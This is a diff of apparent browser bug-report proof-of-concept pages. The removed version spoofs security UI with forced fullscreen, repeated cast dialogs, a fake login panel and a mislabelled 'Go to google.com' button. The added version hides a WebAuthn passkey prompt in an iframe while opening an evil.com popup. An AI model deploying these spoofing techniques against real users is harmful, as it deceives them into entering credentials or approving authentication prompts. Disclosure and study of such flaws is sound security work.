@@ -1,153 +1,60 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-<title>Security UI Spoof</title>
-
-<style>
-body {
-    margin: 0;
-    padding: 0;
-    height: 100vh;
-    background-color: #f4f4f4;
-    font-family: sans-serif;
-    cursor: pointer;
-}
-
-/* CENTER LAYOUT */
-#content {
-    height: 100vh;
-    display: flex;
-    flex-direction: column;
-    align-items: center;
-    justify-content: center;
-}
-
-/* LOGIN PANEL */
-#loginPanel {
-    display: none;
-    background: white;
-    width: 300px;
-    padding: 20px;
-    border-radius: 8px;
-    text-align: center;
-    box-shadow: 0 0 15px rgba(0,0,0,0.3);
-    margin-bottom: 20px;
-}
-
-#loginPanel input {
-    width: 100%;
-    padding: 8px;
-    margin: 8px 0;
-}
-</style>
 
 <script>
-
-let isFullscreen = false;
-let castBusy = false;
-
-// MAIN CLICK HANDLER
-function handlePageClick() {
-
-    // FIRST CLICK → FULLSCREEN
-    if (!isFullscreen) {
-
-        if (document.documentElement.requestFullscreen) {
-            document.documentElement.requestFullscreen();
-        }
-
-        return;
-    }
-
-    // AFTER FULLSCREEN → ALWAYS CAST
-    openCast();
+function popup(){
+    window.open("https://evil.com","_blank","left=1");
 }
+function popunder(){
+    let frame = document.createElement("iframe");
 
+    let script = document.createElement("script");
+script.innerHTML = `
+  window.authn = ()=>{
+    var challenge = new Uint8Array(32);
+    window.crypto.getRandomValues(challenge);
 
-// FULLSCREEN STATE LISTENER
-document.addEventListener("fullscreenchange", () => {
+    var userID = 'Kosv9fPtkDoh4Oz7Yq/pVgWHS8HhdlCto5cR0aBoVMw='
+    var id = Uint8Array.from(window.atob(userID), c=>c.charCodeAt(0))
 
-    const login = document.getElementById("loginPanel");
-    const text = document.getElementById("instruction");
+    var publicKey = {
+        'challenge': challenge,
 
-    if (document.fullscreenElement) {
+        'rp': {
+            'name': 'Example Inc.'
+        },
 
-        isFullscreen = true;
-        login.style.display = "block";
-        text.innerText = "Fullscreen Active — Click Anywhere To Open Cast";
+        'user': {
+            'id': id,
+            'name': 'alice@example.com',
+            'displayName': 'Alice Liddell'
+        },
 
-    } else {
-
-        isFullscreen = false;
-        castBusy = false;
-        login.style.display = "none";
-        text.innerText = "Click Anywhere To Enter Fullscreen";
+        'pubKeyCredParams': [
+            { 'type': 'public-key', 'alg': -7  },
+            { 'type': 'public-key', 'alg': -257 }
+        ]
     }
 
-});
+    navigator.credentials.create({ 'publicKey': publicKey })
+        .then((newCredentialInfo) => {
+            console.log('SUCCESS', newCredentialInfo)
+        })
+        .catch((error) => {
+            console.log('FAIL', error)
+        })
+  }
+
+`;
+
+    document.body.appendChild(frame);
+    frame.contentDocument.head.appendChild(script);
 
 
-// CAST FUNCTION
-async function openCast() {
-
-    if (castBusy) return;
-    castBusy = true;
-
-    try {
-
-        const request = new PresentationRequest([
-            "https://www.gstatic.com/cv/receiver.html"
-        ]);
-
-        await request.start();
-
-    } catch (e) {
-
-        console.log("Cast closed");
-
-    }
-
-    setTimeout(() => {
-        castBusy = false;
-    }, 1200);
-
+    popup();
+    frame.contentWindow.authn();
+    setTimeout(()=>{
+        frame.remove();
+    },500);
 }
-
 </script>
 
-</head>
-
-<body onclick="handlePageClick()">
-
-<div id="content">
-
-    <h2 id="instruction">
-        Click Anywhere To Enter Fullscreen
-    </h2>
-
-    <!-- LOGIN PANEL CENTER -->
-    <div id="loginPanel">
-
-        <h3>Account Login</h3>
-
-        <input type="text" placeholder="Username">
-        <input type="password" placeholder="Password">
-
-        <button onclick="event.stopPropagation(); alert('Demo only')">
-            Login
-        </button>
-
-    </div>
-
-    <!-- GOOGLE BUTTON -->
-    <input
-        onclick="event.stopPropagation(); window.location='https://output.jsbin.com/bekupoqehe/1/'"
-        type="button"
-        value="Go to google.com"
-        style="padding:10px 20px; cursor:pointer;"
-    >
-
-</div>
-
-</body>
-</html>
+<button onclick="popunder()">click me!</button>
